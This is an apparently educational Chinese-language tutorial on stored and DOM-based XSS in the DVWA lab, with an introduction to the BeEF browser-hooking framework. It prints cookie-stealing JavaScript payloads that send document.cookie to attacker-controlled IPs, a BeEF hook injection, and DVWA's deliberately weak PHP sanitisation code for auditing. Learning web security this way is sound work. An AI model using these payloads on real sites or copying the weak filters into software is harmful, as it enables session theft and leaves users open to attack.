# XSS存储型

存储型XSS原理：

- 可长期存储于服务器端
- 每次攻击访问都会被执行js脚本，攻击者只需侦听指定端口

**注：** 攻击利用方法大体等于反射性XSS利用；多出现在留言板等位置；使用Burpsuite更方便

1. 观察返回结果，是否原封不动地返回输入数据？是否有其他标签

![XSS7](img/XSS/XSS7.png)

数据原封不动的返回给了客户端

注入js代码，通过留言板存储在服务器中，所以每次点击留言板链接，都会弹出XSS弹窗

```
<script>alert("XSS")</script>
```

![XSS8](img/XSS/XSS8.png)



2.测试加载攻击者控制的服务器中的js文件

```
#实验步骤：
1.启动apache2服务
2.创建a.js文件 
3.注入代码
4.侦听88端口,接受返回的数据
```

```
#a.js
var img=new Image();
img.src="http://10.252.201.241:88/cookies.php?cookie="+document.cookie
```

```
#注入代码
<script src="http://10.252.201.241/a.js"></script>
```



![XSS9](img/XSS/XSS9.png)

**DVWA存储型XSS代码审计：**

*low:*

```
 <?php
if(isset($_POST['btnSign']))
{
   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);  
   // Sanitize name input
   $name = mysql_real_escape_string($name);  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );  
}
?> 
```

*medium:*

```
 <?php

if(isset($_POST['btnSign']))
{
   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);   
   // Sanitize message input
   $message = trim(strip_tags(addslashes($message)));
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);    
   // Sanitize name input
   $name = str_replace('<script>', '', $name);
   $name = mysql_real_escape_string($name);  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );   
}
?> 
```

*high:*

```
 <?php
if(isset($_POST['btnSign']))
{
   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);  
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);   
   // Sanitize name input
   $name = stripslashes($name);
   $name = mysql_real_escape_string($name); 
   $name = htmlspecialchars($name);  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );  
}
?> 
```























# XSS DOM型

> 一套js和其他语言都可以调用的标准API，本质和反射型中利用src方法一样，只是调用的函数不一样而已

```
<script>
var img=document.createElement("img");
img.src="http://192.168.56.102:88/cookie.php?cookie="+escape(document.cookie)
</script>
```





# BeEF

> BeEF是目前欧美最流行的web框架攻击平台，可用于生成、交互payload【内含大量模块，payload】
>
> 服务器端：管理hooked客户端
>
> 客户端：运行于客户端浏览器的JavaScript脚本

**浏览器攻击面：**

应用普遍转移到B/S架构，浏览器成为统一客户端程序；大部分需要结合社会工程学方法对浏览器进行攻击；攻击浏览器用户；通过注入的JS脚本，利用浏览器攻击其他网站

**攻击手段：**

利用网站xss漏洞实现攻击；诱使客户端访问含有hooked的伪造站点；结合[中间人攻击](http://netsecurity.51cto.com/art/201303/386031.htm)注入hooked脚本

**常见用途：**

键盘记录器；网络扫描；浏览器信息收集；绑定shell；与Matesploit集成



**使用方法**

1.默认登录账号密码beff/beff

2.XSS注入`<script src="http://127.0.0.1:3000/hook.js"></script>`

![XSS10](img/XSS/XSS10.png)

![XSS11](img/XSS/XSS11.png)

3. 模块

![XSS12](img/XSS/XSS12.png)

**注：**点击对应模块即可使用，响应速度比较慢，**绿色**为适用；**橙色**也是可用，但是会被客户端使用者发现；**红色**可能不可用；**灰色**未知是否可用

- Brower   (浏览器类型，可得cookie，OS等信息)
- Exploits   (漏洞利用模块)
- Network   (可以用作僵尸机)
- Persistence   (持久型hooked，页面关闭主机未离线，仍可对hooked客户端进行操作)







